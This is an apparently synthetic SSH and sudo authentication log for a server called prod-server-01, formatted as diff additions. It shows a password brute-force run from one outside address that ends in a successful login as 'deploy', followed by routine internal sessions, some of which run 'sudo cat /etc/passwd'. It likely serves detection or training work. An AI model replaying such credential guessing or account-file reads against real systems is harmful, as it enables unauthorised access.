+May 19 14:30:59 prod-server-01 sshd[6359]: Failed password for ubuntu from 203.0.113.42 port 57533 ssh2
+May 19 14:31:00 prod-server-01 sshd[6635]: Failed password for ubuntu from 203.0.113.42 port 60364 ssh2
+May 19 14:31:04 prod-server-01 sshd[5708]: Failed password for ubuntu from 203.0.113.42 port 63804 ssh2
+May 19 14:31:06 prod-server-01 sshd[5026]: Failed password for ubuntu from 203.0.113.42 port 54233 ssh2
+May 19 14:31:09 prod-server-01 sshd[7983]: Failed password for ubuntu from 203.0.113.42 port 58654 ssh2
+May 19 14:31:10 prod-server-01 sshd[7489]: Failed password for ubuntu from 203.0.113.42 port 53958 ssh2
+May 19 14:31:12 prod-server-01 sshd[5652]: Failed password for ubuntu from 203.0.113.42 port 62320 ssh2
+May 19 14:31:13 prod-server-01 sshd[1435]: Failed password for ubuntu from 203.0.113.42 port 53479 ssh2
+May 19 14:31:15 prod-server-01 sshd[8768]: Failed password for ubuntu from 203.0.113.42 port 50808 ssh2
+May 19 14:31:17 prod-server-01 sshd[7066]: Failed password for ubuntu from 203.0.113.42 port 50659 ssh2
+May 19 14:31:18 prod-server-01 sshd[6958]: Failed password for ubuntu from 203.0.113.42 port 55065 ssh2
+May 19 14:31:22 prod-server-01 sshd[4216]: Failed password for ubuntu from 203.0.113.42 port 58180 ssh2
+May 19 14:31:24 prod-server-01 sshd[6475]: Failed password for ubuntu from 203.0.113.42 port 59639 ssh2
+May 19 14:31:25 prod-server-01 sshd[8647]: Failed password for ubuntu from 203.0.113.42 port 54167 ssh2
+May 19 14:31:28 prod-server-01 sshd[8710]: Failed password for ubuntu from 203.0.113.42 port 57675 ssh2
+May 19 14:31:29 prod-server-01 sshd[7597]: Failed password for ubuntu from 203.0.113.42 port 64392 ssh2
+May 19 14:31:33 prod-server-01 sshd[8666]: Failed password for ubuntu from 203.0.113.42 port 57612 ssh2
+May 19 14:31:37 prod-server-01 sshd[2848]: Failed password for ubuntu from 203.0.113.42 port 53712 ssh2
+May 19 14:31:39 prod-server-01 sshd[9259]: Failed password for ubuntu from 203.0.113.42 port 60093 ssh2
+May 19 14:31:43 prod-server-01 sshd[9922]: Failed password for ubuntu from 203.0.113.42 port 53479 ssh2
+May 19 14:31:44 prod-server-01 sshd[4241]: Failed password for ubuntu from 203.0.113.42 port 56034 ssh2
+May 19 14:31:48 prod-server-01 sshd[4416]: Failed password for ubuntu from 203.0.113.42 port 53922 ssh2
+May 19 14:31:52 prod-server-01 sshd[1526]: Failed password for ubuntu from 203.0.113.42 port 50165 ssh2
+May 19 14:31:56 prod-server-01 sshd[2744]: Failed password for ubuntu from 203.0.113.42 port 57477 ssh2
+May 19 14:31:58 prod-server-01 sshd[6331]: Failed password for ubuntu from 203.0.113.42 port 65346 ssh2
+May 19 14:32:00 prod-server-01 sshd[4291]: Failed password for ubuntu from 203.0.113.42 port 51258 ssh2
+May 19 14:32:03 prod-server-01 sshd[4588]: Failed password for ubuntu from 203.0.113.42 port 49443 ssh2
+May 19 14:32:06 prod-server-01 sshd[3966]: Failed password for ubuntu from 203.0.113.42 port 63065 ssh2
+May 19 14:32:08 prod-server-01 sshd[6108]: Failed password for ubuntu from 203.0.113.42 port 52504 ssh2
+May 19 14:32:10 prod-server-01 sshd[7956]: Failed password for ubuntu from 203.0.113.42 port 52380 ssh2
+May 19 14:32:12 prod-server-01 sshd[8643]: Failed password for ubuntu from 203.0.113.42 port 62682 ssh2
+May 19 14:32:16 prod-server-01 sshd[1328]: Failed password for ubuntu from 203.0.113.42 port 63795 ssh2
+May 19 14:32:20 prod-server-01 sshd[5753]: Failed password for ubuntu from 203.0.113.42 port 52079 ssh2
+May 19 14:32:24 prod-server-01 sshd[9428]: Failed password for ubuntu from 203.0.113.42 port 53808 ssh2
+May 19 14:32:28 prod-server-01 sshd[1496]: Failed password for ubuntu from 203.0.113.42 port 54002 ssh2
+May 19 14:32:32 prod-server-01 sshd[1130]: Failed password for ubuntu from 203.0.113.42 port 62584 ssh2
+May 19 14:32:36 prod-server-01 sshd[1971]: Failed password for ubuntu from 203.0.113.42 port 57634 ssh2
+May 19 14:32:37 prod-server-01 sshd[5460]: Failed password for ubuntu from 203.0.113.42 port 62949 ssh2
+May 19 14:32:40 prod-server-01 sshd[7800]: Failed password for ubuntu from 203.0.113.42 port 63647 ssh2
+May 19 14:32:43 prod-server-01 sshd[4496]: Failed password for ubuntu from 203.0.113.42 port 56795 ssh2
+May 19 14:32:47 prod-server-01 sshd[7584]: Failed password for ubuntu from 203.0.113.42 port 65239 ssh2
+May 19 14:32:48 prod-server-01 sshd[7557]: Failed password for ubuntu from 203.0.113.42 port 54368 ssh2
+May 19 14:32:50 prod-server-01 sshd[9177]: Failed password for ubuntu from 203.0.113.42 port 51166 ssh2
+May 19 14:32:51 prod-server-01 sshd[5399]: Failed password for ubuntu from 203.0.113.42 port 58739 ssh2
+May 19 14:32:54 prod-server-01 sshd[7230]: Failed password for ubuntu from 203.0.113.42 port 54424 ssh2
+May 19 14:32:58 prod-server-01 sshd[4541]: Failed password for ubuntu from 203.0.113.42 port 61561 ssh2
+May 19 14:33:02 prod-server-01 sshd[1108]: Failed password for ubuntu from 203.0.113.42 port 64655 ssh2
+May 19 14:33:05 prod-server-01 sshd[8553]: Failed password for ubuntu from 203.0.113.42 port 49210 ssh2
+May 19 14:33:08 prod-server-01 sshd[4461]: Failed password for ubuntu from 203.0.113.42 port 57296 ssh2
+May 19 14:33:11 prod-server-01 sshd[4061]: Failed password for ubuntu from 203.0.113.42 port 61994 ssh2
+May 19 14:33:15 prod-server-01 sshd[7014]: Failed password for ubuntu from 203.0.113.42 port 57465 ssh2
+May 19 14:33:17 prod-server-01 sshd[5311]: Failed password for ubuntu from 203.0.113.42 port 53540 ssh2
+May 19 14:33:18 prod-server-01 sshd[7866]: Failed password for ubuntu from 203.0.113.42 port 62315 ssh2
+May 19 14:33:21 prod-server-01 sshd[6996]: Failed password for ubuntu from 203.0.113.42 port 55003 ssh2
+May 19 14:34:15 prod-server-01 sshd[8139]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 14:35:54 prod-server-01 sshd[2247]: Accepted password for monitor from 192.168.1.10 port 50490 ssh2
+May 19 14:35:56 prod-server-01 sshd[2287]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 14:41:37 prod-server-01 sshd[6747]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 14:42:41 prod-server-01 sshd[5359]: Accepted password for monitor from 10.0.0.2 port 50509 ssh2
+May 19 14:42:43 prod-server-01 sshd[4211]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 14:43:13 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 14:45:54 prod-server-01 sshd[8116]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 14:47:24 prod-server-01 sshd[9388]: Accepted password for monitor from 10.0.0.5 port 51393 ssh2
+May 19 14:47:26 prod-server-01 sshd[3125]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 14:50:59 prod-server-01 sshd[1031]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 14:52:03 prod-server-01 sshd[6998]: Failed password for deploy from 203.0.113.42 port 59125 ssh2
+May 19 14:52:06 prod-server-01 sshd[8913]: Failed password for deploy from 203.0.113.42 port 57880 ssh2
+May 19 14:52:09 prod-server-01 sshd[7715]: Accepted password for ubuntu from 10.0.0.2 port 60155 ssh2
+May 19 14:52:09 prod-server-01 sshd[1141]: Failed password for deploy from 203.0.113.42 port 51962 ssh2
+May 19 14:52:11 prod-server-01 sshd[5021]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 14:52:12 prod-server-01 sshd[4197]: Failed password for deploy from 203.0.113.42 port 51792 ssh2
+May 19 14:52:15 prod-server-01 sshd[3865]: Failed password for deploy from 203.0.113.42 port 63763 ssh2
+May 19 14:52:23 prod-server-01 sshd[3291]: Accepted password for deploy from 203.0.113.42 port 55274 ssh2
+May 19 14:52:25 prod-server-01 sshd[2232]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 14:53:57 prod-server-01 sshd[7400]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 14:55:16 prod-server-01 sshd[4473]: Accepted password for appuser from 10.0.0.5 port 55440 ssh2
+May 19 14:55:18 prod-server-01 sshd[3902]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 14:58:54 prod-server-01 sshd[3033]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 14:59:47 prod-server-01 sshd[6546]: Accepted password for ubuntu from 192.168.1.10 port 56710 ssh2
+May 19 14:59:49 prod-server-01 sshd[5090]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 15:00:01 prod-server-01 CRON[4881]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 15:00:03 prod-server-01 CRON[1864]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 15:06:12 prod-server-01 sshd[3361]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 15:07:11 prod-server-01 sshd[4213]: Accepted password for backup from 192.168.1.10 port 56669 ssh2
+May 19 15:07:13 prod-server-01 sshd[8034]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 15:17:01 prod-server-01 sshd[4089]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 15:18:06 prod-server-01 sshd[3592]: Accepted password for deploy from 10.0.0.2 port 51438 ssh2
+May 19 15:18:08 prod-server-01 sshd[2977]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 15:18:38 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 15:27:02 prod-server-01 sshd[9880]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 15:28:43 prod-server-01 sshd[1503]: Accepted password for ubuntu from 10.0.0.5 port 55876 ssh2
+May 19 15:28:45 prod-server-01 sshd[9059]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 15:36:36 prod-server-01 sshd[3560]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 15:36:56 prod-server-01 sshd[9415]: Accepted password for appuser from 192.168.1.20 port 58392 ssh2
+May 19 15:36:58 prod-server-01 sshd[7276]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 15:45:28 prod-server-01 sshd[9015]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 15:46:18 prod-server-01 sshd[9618]: Accepted password for ubuntu from 10.0.0.5 port 56512 ssh2
+May 19 15:46:20 prod-server-01 sshd[6854]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 15:46:50 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 15:54:35 prod-server-01 sshd[8743]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 15:55:17 prod-server-01 sshd[1471]: Accepted password for backup from 10.0.0.5 port 60029 ssh2
+May 19 15:55:19 prod-server-01 sshd[8162]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 16:00:01 prod-server-01 CRON[4521]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 16:00:03 prod-server-01 CRON[3448]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 16:04:34 prod-server-01 sshd[9637]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 16:06:23 prod-server-01 sshd[9621]: Accepted password for deploy from 192.168.1.20 port 57137 ssh2
+May 19 16:06:25 prod-server-01 sshd[1685]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 16:08:47 prod-server-01 sshd[5429]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 16:10:04 prod-server-01 sshd[7611]: Accepted password for monitor from 10.0.0.5 port 51513 ssh2
+May 19 16:10:06 prod-server-01 sshd[9014]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 16:10:36 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 16:13:21 prod-server-01 sshd[7598]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 16:14:06 prod-server-01 sshd[8543]: Accepted password for ubuntu from 192.168.1.20 port 53684 ssh2
+May 19 16:14:08 prod-server-01 sshd[6385]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 16:14:38 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 16:21:27 prod-server-01 sshd[7321]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 16:22:43 prod-server-01 sshd[5995]: Accepted password for deploy from 10.0.0.5 port 63488 ssh2
+May 19 16:22:45 prod-server-01 sshd[4959]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 16:28:50 prod-server-01 sshd[4183]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 16:29:35 prod-server-01 sshd[4396]: Accepted password for monitor from 192.168.1.20 port 65381 ssh2
+May 19 16:29:37 prod-server-01 sshd[6889]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 16:34:53 prod-server-01 sshd[6625]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 16:36:25 prod-server-01 sshd[6922]: Accepted password for appuser from 10.0.0.2 port 59226 ssh2
+May 19 16:36:27 prod-server-01 sshd[6363]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 16:41:17 prod-server-01 sshd[6982]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 16:42:40 prod-server-01 sshd[4219]: Accepted password for ubuntu from 10.0.0.5 port 56974 ssh2
+May 19 16:42:42 prod-server-01 sshd[3520]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 16:49:04 prod-server-01 sshd[9063]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 16:49:27 prod-server-01 sshd[5325]: Accepted password for ubuntu from 10.0.0.2 port 63989 ssh2
+May 19 16:49:29 prod-server-01 sshd[6188]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 16:53:01 prod-server-01 sshd[2961]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 16:54:23 prod-server-01 sshd[6678]: Accepted password for appuser from 192.168.1.20 port 53640 ssh2
+May 19 16:54:25 prod-server-01 sshd[9175]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 16:54:55 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 16:58:38 prod-server-01 sshd[7561]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 16:58:48 prod-server-01 sshd[5677]: Accepted password for ubuntu from 10.0.0.5 port 59423 ssh2
+May 19 16:58:50 prod-server-01 sshd[3495]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 17:00:01 prod-server-01 CRON[1029]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 19 17:00:03 prod-server-01 CRON[6110]: pam_unix(cron:session): session closed for user root by (uid=0)
+May 19 17:02:54 prod-server-01 sshd[6086]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 17:04:46 prod-server-01 sshd[6161]: Accepted password for ubuntu from 192.168.1.10 port 52959 ssh2
+May 19 17:04:48 prod-server-01 sshd[8898]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 17:14:28 prod-server-01 sshd[6640]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 17:14:34 prod-server-01 sshd[4544]: Accepted password for ubuntu from 10.0.0.5 port 50861 ssh2
+May 19 17:14:36 prod-server-01 sshd[2643]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 17:15:06 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 17:17:53 prod-server-01 sshd[1538]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 17:18:32 prod-server-01 sshd[2752]: Accepted password for monitor from 192.168.1.10 port 57228 ssh2
+May 19 17:18:34 prod-server-01 sshd[6590]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 17:22:58 prod-server-01 sshd[9838]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 17:23:29 prod-server-01 sshd[7498]: Accepted password for monitor from 192.168.1.20 port 57643 ssh2
+May 19 17:23:31 prod-server-01 sshd[8582]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 17:24:01 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 17:32:05 prod-server-01 sshd[6434]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 17:32:28 prod-server-01 sshd[8712]: Accepted password for ubuntu from 10.0.0.5 port 59284 ssh2
+May 19 17:32:30 prod-server-01 sshd[7143]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 17:36:20 prod-server-01 sshd[8253]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 17:37:56 prod-server-01 sshd[2597]: Accepted password for backup from 10.0.0.5 port 57595 ssh2
+May 19 17:37:58 prod-server-01 sshd[7531]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 17:40:11 prod-server-01 sshd[8656]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 17:41:06 prod-server-01 sshd[9664]: Accepted password for ubuntu from 10.0.0.5 port 49742 ssh2
+May 19 17:41:08 prod-server-01 sshd[5175]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 17:41:38 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 17:45:02 prod-server-01 sshd[4364]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 17:46:20 prod-server-01 sshd[1173]: Accepted password for ubuntu from 192.168.1.10 port 56158 ssh2
+May 19 17:46:22 prod-server-01 sshd[3798]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 17:47:31 prod-server-01 sshd[9457]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 17:48:41 prod-server-01 sshd[3228]: Accepted password for appuser from 10.0.0.2 port 55180 ssh2
+May 19 17:48:43 prod-server-01 sshd[2620]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 17:49:13 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 17:50:57 prod-server-01 sshd[1551]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 17:52:30 prod-server-01 sshd[6510]: Accepted password for backup from 192.168.1.10 port 57533 ssh2
+May 19 17:52:32 prod-server-01 sshd[5850]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 17:53:02 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 17:54:59 prod-server-01 sshd[2945]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 17:55:36 prod-server-01 sshd[5370]: Accepted password for monitor from 192.168.1.20 port 52165 ssh2
+May 19 17:55:38 prod-server-01 sshd[3930]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 18:03:59 prod-server-01 sshd[5825]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 18:05:51 prod-server-01 sshd[9829]: Accepted password for appuser from 10.0.0.5 port 58043 ssh2
+May 19 18:05:53 prod-server-01 sshd[3894]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 18:06:23 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 18:10:00 prod-server-01 sshd[4945]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 18:10:26 prod-server-01 sshd[4303]: Accepted password for backup from 10.0.0.5 port 57767 ssh2
+May 19 18:10:28 prod-server-01 sshd[9710]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 18:15:28 prod-server-01 sshd[2534]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 18:16:39 prod-server-01 sshd[6692]: Accepted password for ubuntu from 10.0.0.2 port 61532 ssh2
+May 19 18:16:41 prod-server-01 sshd[2536]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 18:17:11 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 18:23:13 prod-server-01 sshd[5348]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 18:24:34 prod-server-01 sshd[2863]: Accepted password for backup from 192.168.1.10 port 53612 ssh2
+May 19 18:24:36 prod-server-01 sshd[2966]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 18:28:03 prod-server-01 sshd[3265]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 18:29:31 prod-server-01 sshd[4337]: Accepted password for backup from 10.0.0.2 port 49279 ssh2
+May 19 18:29:33 prod-server-01 sshd[4867]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 18:31:37 prod-server-01 sshd[7918]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 18:32:55 prod-server-01 sshd[4891]: Accepted password for deploy from 10.0.0.2 port 52880 ssh2
+May 19 18:32:57 prod-server-01 sshd[6858]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 18:33:27 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 18:42:07 prod-server-01 sshd[8722]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 18:42:25 prod-server-01 sshd[1671]: Accepted password for deploy from 10.0.0.2 port 59945 ssh2
+May 19 18:42:27 prod-server-01 sshd[3047]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 18:42:57 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 18:50:44 prod-server-01 sshd[4863]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 18:52:42 prod-server-01 sshd[2199]: Accepted password for appuser from 10.0.0.5 port 50886 ssh2
+May 19 18:52:44 prod-server-01 sshd[4755]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 18:54:12 prod-server-01 sshd[2837]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 18:55:48 prod-server-01 sshd[3875]: Accepted password for backup from 10.0.0.2 port 58482 ssh2
+May 19 18:55:50 prod-server-01 sshd[1346]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 18:58:07 prod-server-01 sshd[5427]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 18:59:18 prod-server-01 sshd[8124]: Accepted password for appuser from 192.168.1.10 port 54818 ssh2
+May 19 18:59:20 prod-server-01 sshd[9464]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 18:59:50 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 19:05:14 prod-server-01 sshd[4030]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 19:06:33 prod-server-01 sshd[8906]: Accepted password for ubuntu from 10.0.0.2 port 55501 ssh2
+May 19 19:06:35 prod-server-01 sshd[8745]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 19:10:47 prod-server-01 sshd[7065]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 19:12:44 prod-server-01 sshd[4885]: Accepted password for ubuntu from 192.168.1.20 port 61148 ssh2
+May 19 19:12:46 prod-server-01 sshd[4407]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 19:21:49 prod-server-01 sshd[2316]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 19:22:16 prod-server-01 sshd[2990]: Accepted password for monitor from 10.0.0.5 port 54261 ssh2
+May 19 19:22:18 prod-server-01 sshd[1290]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 19:26:07 prod-server-01 sshd[1353]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 19:27:13 prod-server-01 sshd[7592]: Accepted password for deploy from 10.0.0.5 port 55227 ssh2
+May 19 19:27:15 prod-server-01 sshd[3504]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 19:34:43 prod-server-01 sshd[1799]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 19:35:28 prod-server-01 sshd[2387]: Accepted password for ubuntu from 10.0.0.5 port 64030 ssh2
+May 19 19:35:30 prod-server-01 sshd[3372]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 19:39:30 prod-server-01 sshd[6439]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 19:40:17 prod-server-01 sshd[5408]: Accepted password for monitor from 10.0.0.2 port 64849 ssh2
+May 19 19:40:19 prod-server-01 sshd[6968]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 19:40:49 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 19:49:41 prod-server-01 sshd[9566]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 19:51:14 prod-server-01 sshd[5307]: Accepted password for deploy from 10.0.0.2 port 58516 ssh2
+May 19 19:51:16 prod-server-01 sshd[9022]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 19:51:46 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 19:55:24 prod-server-01 sshd[6357]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 19:55:37 prod-server-01 sshd[9164]: Accepted password for appuser from 10.0.0.2 port 59577 ssh2
+May 19 19:55:39 prod-server-01 sshd[2196]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 19:56:09 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 20:06:08 prod-server-01 sshd[9403]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 20:06:33 prod-server-01 sshd[5208]: Accepted password for deploy from 10.0.0.2 port 56510 ssh2
+May 19 20:06:35 prod-server-01 sshd[8684]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 20:14:20 prod-server-01 sshd[7142]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 20:16:00 prod-server-01 sshd[2722]: Accepted password for monitor from 10.0.0.2 port 54436 ssh2
+May 19 20:16:02 prod-server-01 sshd[9329]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 20:16:32 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 20:23:09 prod-server-01 sshd[6399]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 20:24:24 prod-server-01 sshd[8076]: Accepted password for deploy from 192.168.1.20 port 50328 ssh2
+May 19 20:24:26 prod-server-01 sshd[5328]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 20:31:18 prod-server-01 sshd[1938]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 20:33:15 prod-server-01 sshd[2515]: Accepted password for deploy from 10.0.0.5 port 54661 ssh2
+May 19 20:33:17 prod-server-01 sshd[7600]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 20:41:03 prod-server-01 sshd[8092]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 20:42:04 prod-server-01 sshd[3440]: Accepted password for backup from 192.168.1.20 port 62746 ssh2
+May 19 20:42:06 prod-server-01 sshd[4191]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 20:49:48 prod-server-01 sshd[5838]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 20:50:39 prod-server-01 sshd[3892]: Accepted password for backup from 10.0.0.5 port 61864 ssh2
+May 19 20:50:41 prod-server-01 sshd[1956]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 20:51:11 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 21:01:04 prod-server-01 sshd[7528]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 21:02:54 prod-server-01 sshd[8689]: Accepted password for monitor from 10.0.0.2 port 60429 ssh2
+May 19 21:02:56 prod-server-01 sshd[3682]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 21:09:55 prod-server-01 sshd[4063]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 21:11:27 prod-server-01 sshd[8074]: Accepted password for deploy from 10.0.0.2 port 62000 ssh2
